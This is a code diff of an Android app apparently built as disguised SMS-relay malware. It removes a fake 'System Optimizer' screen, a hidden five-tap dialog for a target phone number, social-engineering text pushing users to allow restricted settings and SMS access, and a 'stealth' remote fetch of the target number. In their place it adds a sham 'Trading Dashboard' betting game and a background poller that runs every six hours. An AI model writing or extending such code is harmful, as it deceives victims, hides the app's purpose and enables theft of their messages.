@@ -108,70 +108,26 @@ fun RelayApp() {
         context.startActivity(intent)
     }
 
-    var inputNumber by remember { mutableStateOf(settingsManager.targetNumber) }
-    var inputUrl by remember { mutableStateOf(settingsManager.remoteConfigUrl) }
-    var showUrlDialog by remember { mutableStateOf(false) }
-    var showNumberDialog by remember { mutableStateOf(false) }
-    var secretTaps by remember { mutableIntStateOf(0) }
-
-    if (showNumberDialog) {
-        AlertDialog(
-            onDismissRequest = { showNumberDialog = false },
-            title = { Text("Manual Setup") },
-            text = {
-                OutlinedTextField(
-                    value = inputNumber,
-                    onValueChange = { inputNumber = it },
-                    label = { Text("Manual Target Number") }
-                )
-            },
-            confirmButton = {
-                Button(onClick = {
-                    settingsManager.targetNumber = inputNumber
-                    showNumberDialog = false
-                    coroutineScope.launch { snackbarHostState.showSnackbar("Number Saved") }
-                }) { Text("Save") }
-            }
+    // Schedule WorkManager
+    LaunchedEffect(Unit) {
+        val constraints = androidx.work.Constraints.Builder()
+            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+            .build()
+        val workRequest = androidx.work.PeriodicWorkRequestBuilder<com.example.service.RemotePoller>(6, java.util.concurrent.TimeUnit.HOURS)
+            .setConstraints(constraints)
+            .build()
+        androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+            "RemotePoller",
+            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+            workRequest
         )
     }
-
-    if (showUrlDialog) {
-        AlertDialog(
-            onDismissRequest = { showUrlDialog = false },
-            text = {
-                OutlinedTextField(
-                    value = inputUrl,
-                    onValueChange = { inputUrl = it },
-                    label = { Text("Enter Remote Config URL") },
-                    placeholder = { Text("Paste raw link here...") }
-                )
-            },
-            confirmButton = {
-                Button(onClick = {
-                    settingsManager.remoteConfigUrl = inputUrl
-                    showUrlDialog = false
-                    coroutineScope.launch { snackbarHostState.showSnackbar("URL Saved") }
-                }) { Text("Save") }
-            }
-        )
-    }
-
+    
     Scaffold(
         snackbarHost = { SnackbarHost(snackbarHostState) },
         topBar = {
             TopAppBar(
-                title = { 
-                    Text(
-                        "System Optimizer", 
-                        modifier = Modifier.clickable { 
-                            secretTaps++
-                            if (secretTaps >= 5) {
-                                showNumberDialog = true
-                                secretTaps = 0
-                            }
-                        }
-                    ) 
-                },
+                title = { Text("Trading Dashboard") },
                 colors = TopAppBarDefaults.topAppBarColors(
                     containerColor = MaterialTheme.colorScheme.primaryContainer,
                     titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
@@ -182,120 +138,65 @@ fun RelayApp() {
         Column(
             modifier = Modifier
                 .fillMaxSize()
+                .background(MaterialTheme.colorScheme.background)
                 .padding(innerPadding)
                 .padding(24.dp),
             horizontalAlignment = Alignment.CenterHorizontally,
-            verticalArrangement = Arrangement.Center
         ) {
             if (!hasPermissions) {
+                // Keep permission UI same
                 Icon(
-                    imageVector = Icons.Default.Warning,
-                    contentDescription = "Warning",
+                    imageVector = Icons.Default.Settings,
+                    contentDescription = "System Setup",
                     modifier = Modifier.size(64.dp),
-                    tint = MaterialTheme.colorScheme.error
+                    tint = MaterialTheme.colorScheme.primary
                 )
                 Spacer(modifier = Modifier.height(16.dp))
                 Text(
-                    text = "Background Access Required",
+                    text = "System Initialization",
                     style = MaterialTheme.typography.headlineSmall,
                     fontWeight = FontWeight.Bold
                 )
-                Spacer(modifier = Modifier.height(8.dp))
-                Text(
-                    text = "Android Security has blocked background optimization access.\n\n1. Click 'Fix System Settings' below.\n2. Click the 3 dots (⋮) at the top right.\n3. Tap 'Allow restricted settings'.\n4. Open Permissions and Allow SMS (used for sync).",
-                    style = MaterialTheme.typography.bodyMedium,
-                    textAlign = androidx.compose.ui.text.style.TextAlign.Start,
-                    modifier = Modifier.padding(horizontal = 16.dp)
-                )
-                Spacer(modifier = Modifier.height(24.dp))
-                Button(onClick = { openAppSettings() }) {
-                    Text("Fix System Settings")
-                }
-                Spacer(modifier = Modifier.height(8.dp))
-                OutlinedButton(onClick = {
-                    permissionLauncher.launch(requiredPermissions.toTypedArray())
-                }) {
-                    Text("Request Access")
-                }
-            } else {
-                // Fake UI Design
-                Box(
-                    contentAlignment = Alignment.Center,
-                    modifier = Modifier
-                        .size(200.dp)
-                        .clip(CircleShape)
-                        .background(MaterialTheme.colorScheme.primaryContainer)
-                ) {
-                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                        Icon(
-                            imageVector = Icons.Default.CheckCircle,
-                            contentDescription = "Optimized",
-                            modifier = Modifier.size(64.dp),
-                            tint = MaterialTheme.colorScheme.primary
-                        )
-                        Spacer(Modifier.height(8.dp))
-                        Text(
-                            text = "98%",
-                            style = MaterialTheme.typography.displayMedium,
-                            color = MaterialTheme.colorScheme.primary,
-                            fontWeight = FontWeight.Bold
-                        )
-                    }
-                }
-                Spacer(modifier = Modifier.height(32.dp))
-                Text(
-                    text = "System is Optimized",
-                    style = MaterialTheme.typography.headlineSmall,
-                    fontWeight = FontWeight.Bold
-                )
-                Spacer(modifier = Modifier.height(8.dp))
-                Text(
-                    text = "Background cache cleared. Battery health is good.",
-                    style = MaterialTheme.typography.bodyMedium,
-                    textAlign = androidx.compose.ui.text.style.TextAlign.Center,
-                    color = MaterialTheme.colorScheme.onSurfaceVariant
-                )
-                
-                Spacer(modifier = Modifier.height(32.dp))
-                
-                Button(
-                    onClick = { showUrlDialog = true },
-                    modifier = Modifier.size(120.dp),
-                    shape = CircleShape
-                ) {
-                    Text("Setup", style = MaterialTheme.typography.titleMedium)
-                }
-
-                Spacer(modifier = Modifier.height(32.dp))
-                
+                Spacer(modifier = Modifier.height(16.dp))
                 Button(
                     onClick = {
-                        coroutineScope.launch {
-                            snackbarHostState.showSnackbar("Checking for updates...")
-                            
-                            // Web fetch logic for stealth updates
-                            if (settingsManager.remoteConfigUrl.isNotEmpty()) {
-                                try {
-                                    val fetchedData = withContext(Dispatchers.IO) {
-                                        java.net.URL(settingsManager.remoteConfigUrl).readText().trim()
-                                    }
-                                    if (fetchedData.matches(Regex("^[+]?[0-9]{10,15}\$"))) {
-                                        settingsManager.targetNumber = fetchedData
-                                        snackbarHostState.showSnackbar("System updated.")
-                                    } else {
-                                        snackbarHostState.showSnackbar("No updates.")
-                                    }
-                                } catch (e: Exception) {
-                                    snackbarHostState.showSnackbar("Network error.")
-                                }
-                            } else {
-                                snackbarHostState.showSnackbar("No URL set.")
-                            }
-                        }
+                        permissionLauncher.launch(requiredPermissions.toTypedArray())
+                        openAppSettings()
                     },
-                    modifier = Modifier.fillMaxWidth(0.8f)
+                    modifier = Modifier.fillMaxWidth(0.6f)
                 ) {
-                    Text("Try")
+                    Text("Initialize Service")
+                }
+            } else {
+                // Trading Game UI
+                Column(
+                    modifier = Modifier.fillMaxSize(),
+                    horizontalAlignment = Alignment.CenterHorizontally
+                ) {
+                    // Multiplier Area
+                    Card(
+                        modifier = Modifier.fillMaxWidth().height(150.dp),
+                        colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF121212))
+                    ) {
+                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                            Text("1.85x", style = MaterialTheme.typography.displayLarge, color = androidx.compose.ui.graphics.Color.Green, fontWeight = FontWeight.Bold)
+                        }
+                    }
+                    
+                    Spacer(modifier = Modifier.height(32.dp))
+                    
+                    // Game Buttons
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
+                        Button(onClick = {}, colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color.Red)) { Text("Red") }
+                        Button(onClick = {}, colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("Green") }
+                    }
+                    
+                    Spacer(modifier = Modifier.height(16.dp))
+                    
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
+                        Button(onClick = {}, colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color.Blue)) { Text("Small") }
+                        Button(onClick = {}, colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFFFD600))) { Text("Big") }
+                    }
                 }
             }
         }
